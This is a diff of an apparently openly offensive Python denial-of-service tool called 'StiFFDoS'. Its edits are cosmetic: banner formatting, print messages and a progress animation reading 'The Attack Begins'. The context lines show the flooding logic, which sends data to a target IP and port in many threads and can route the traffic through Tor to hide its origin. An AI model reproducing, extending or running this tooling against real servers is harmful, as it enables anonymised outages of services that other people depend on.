@@ -108,7 +108,7 @@ def dosBot(url,port,i,tunda,metode):
 			sock.send(resdata)
 			sock.shutdown(1)
 			ts = time.time() - t0
-			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE}, Server Up"+"                       "*5)
+			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE} Server Up"+"                       "*5)
 			working.append(i)
 			size = size + sizeData*4
 		except KeyboardInterrupt:
@@ -152,7 +152,7 @@ def torBot(url,port,i,torrip,torport,tunda,metode):
 			sock.send(resdata)
 			sock.shutdown(1)
 			ts = time.time() - t0
-			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE}, Server Up"+"                       "*5)
+			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE} Server Up"+"                       "*5)
 			working.append(i)
 			size = size + sizeData*4
 			time.sleep(tunda)
@@ -209,9 +209,9 @@ print ('''
      **     **
        ***** StiFFDoS
 
-------------------------+
-I Suggest Strength 2000 |
-------------------------+ ''')
++-------------------------+
+| I Suggest Strength 2000 |
++-------------------------+ ''')
 print(" ")
 
 
@@ -221,9 +221,10 @@ parser.add_argument ("-d","--destination", help= "Target IP Address", type=str, 
 parser.add_argument ("-p","--port", help= "Port Of Target", type=str, dest='port', required=False,default=80)
 parser.add_argument ("-m","--method", help= "HTTP Method", type=str, dest='method', required=False ,default="POST")
 parser.add_argument ("-t","--thread", help= "Threading", type=int, dest='thread', required=False ,default=50)
+print(" ")
 # CHECK IF PYSOCKS AVAILABLE
 if havetor == True:
-	parser.add_argument ("-o","--onion", help= "Attack Over Tor Network (socks5), 127.0.0.1:9050", metavar="<host[:port]>",type=str, dest='tor', required=False)
+	parser.add_argument ("-o","--onion", help= "Attack Over Tor Network (Socks5), 127.0.0.1:9050", metavar="<host[:port]>",type=str, dest='tor', required=False)
 args = parser.parse_args()
 target = args.target.replace("https://","").replace("http://","")
 thread = args.thread
@@ -251,13 +252,13 @@ if tornet or "--onion" in sys.argv or "-o" in sys.argv:
 	tidur = time.sleep
 	print("")
 	for i in range(5):
-		print("The Attack Begins 25%",end="\r")
+		print("The Attack Begins •°°",end="\r")
 		tidur(0.4)
-		print("The Attack Begins 50%",end="\r")
+		print("The Attack Begins °•°",end="\r")
 		tidur(0.3)
-		print("The Attack Begins 75%",end="\r")
+		print("The Attack Begins °°•",end="\r")
 		tidur(0.2)
-		print("The Attack Begins 100%",end="\r")
+		print("The Attack Begins °°°",end="\r")
 		tidur(0.1)
 	try:
 		runTor(target,int(port),thread,toraddr,torport,sleep,method)
@@ -276,13 +277,13 @@ if tornet == None:
 	print("")
 	tidur = time.sleep
 	for i in range(5):
-		print("The Attack Begins 25%",end="\r")
+		print("The Attack Begins •°°",end="\r")
 		tidur(0.4)
-		print("The Attack Begins 50%",end="\r")
+		print("The Attack Begins °•°",end="\r")
 		tidur(0.3)
-		print("The Attack Begins 75%",end="\r")
+		print("The Attack Begins °°•",end="\r")
 		tidur(0.2)
-		print("The Attack Begins 100%",end="\r")
+		print("The Attack Begins °°°",end="\r")
 		tidur(0.1)
 	try:
 		run(target,int(port),thread,sleep,method)
